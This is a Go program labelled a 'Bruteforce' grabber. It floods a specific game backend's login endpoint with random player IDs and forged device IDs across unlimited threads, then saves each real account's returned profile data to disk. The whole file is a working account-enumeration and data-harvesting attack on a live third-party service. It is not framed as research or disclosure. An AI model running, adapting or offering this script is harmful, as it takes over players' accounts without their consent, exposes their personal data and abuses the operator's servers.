package main

import (
	"bytes"
	"crypto/rand"
	"encoding/json"
	"fmt"
	"github.com/google/uuid"
	"io/ioutil"
	"math"
	"math/big"
	"net/http"
	"os"
	"strconv"
	"strings"
	"time"
)

func fjson(str string) interface{} {
	var a interface{}
	json.Unmarshal([]byte(str), &a)
	return a
}

func generateRandomNumber(numberOfDigits int) int {
	maxLimit := int64(int(math.Pow10(numberOfDigits)) - 1)
	lowLimit := int(math.Pow10(numberOfDigits - 1))
	randomNumber, _ := rand.Int(rand.Reader, big.NewInt(maxLimit))
	randomNumberInt := int(randomNumber.Int64())
	if randomNumberInt <= lowLimit {
		randomNumberInt += lowLimit
	}
	if randomNumberInt > int(maxLimit) {
		randomNumberInt = int(maxLimit)
	}
	return randomNumberInt
}

func pr(text string) {
	// fmt.Printf("%s\n", text) // Printing Response Body
	if len(text) > 0 || text != "" {
		username := strings.Split(text, `"Username":`)[1]
		username = strings.Split(username, ",")[0]
		username = strings.Trim(username, "\"")
		if !strings.HasPrefix(username, "Player ") {
			dt := time.Now()
			trophy := strings.Split(text, `"SkillRating":`)[1]
			trophy = strings.Split(trophy, ",")[0]
			crown := strings.Split(text, `"Crowns":`)[1]
			crown = strings.Split(crown, ",")[0]
			hasbp := strings.Split(text, `"HasBattlePass":`)[1]
			hasbp = strings.Split(hasbp, ",")[0]
			createdat := strings.Split(text, `"Created":`)[1]
			createdat = strings.Split(createdat, ",")[0]
			country := strings.Split(text, `"Country":`)[1]
			country = strings.Split(country, ",")[0]
			region := strings.Split(text, `"Region:"`)[1]
			region = strings.Split(region, ",")[0]
			jso, _ := json.MarshalIndent(fjson(text), "", "  ")
			file, _ := os.Create("Result-Grabber-Go/" + username + ".json")
			defer file.Close()
			file.WriteString(string(jso))
			fmt.Printf("[%s] Username: %s\nCountry: %s\nRegion: %s\nCreated At: %s\nCrown: %s\nTrophy: %s\nHas Battle Pass: %s\n", dt.Format("15:04:05"), username, country, region, createdat, crown, trophy, hasbp)
		}
	}
}

func req(url string) {
	client := &http.Client{}
	var p int = generateRandomNumber(9)
	k, _ := uuid.NewRandom()
	l := strings.Replace(k.String(), "-", "", -1)
	js := map[string]interface{}{"Id": p, "DeviceId": l, "Version": "0.37", "FacebookId": "", "GoogleId": "", "AdvertisingId": ""}
	jsonv, _ := json.Marshal(js)
	re, _ := http.NewRequest("POST", url, bytes.NewBuffer(jsonv))
	re.Header.Set("Host", "kitkabackend.eastus.cloudapp.azure.com:5010")
	re.Header.Set("User-Agent", "")
	re.Header.Set("Connection", "")
	re.Header.Set("Content-Type", "application/json")
	re.Header.Set("use_response_compression", "true")
	res, err := client.Do(re)
	if err == nil {
		body, _ := ioutil.ReadAll(res.Body)
		if res.StatusCode == 200 {
			pr(string(body))
		}
		// fmt.Printf("##### %d #####\n", res.StatusCode) // Printing Status Code
		defer res.Body.Close()
	}
}

func main() {
	dt := time.Now()
	thread := os.Args[1]
	thrd, _ := strconv.Atoi(thread)
	url := "http://kitkabackend.eastus.cloudapp.azure.com:5010/user/login"
	os.Mkdir("Result-Grabber-Go", os.ModePerm)
	fmt.Printf("[%s] Starting Bruteforce at %s\n", dt.Format("15:04:05"), dt.Format(time.UnixDate))
	for i := 0; i < thrd; i++ {
		go func() {
			for {
				req(url)
			}
		}()
	}
	for {
	} // Prevent Exit
}
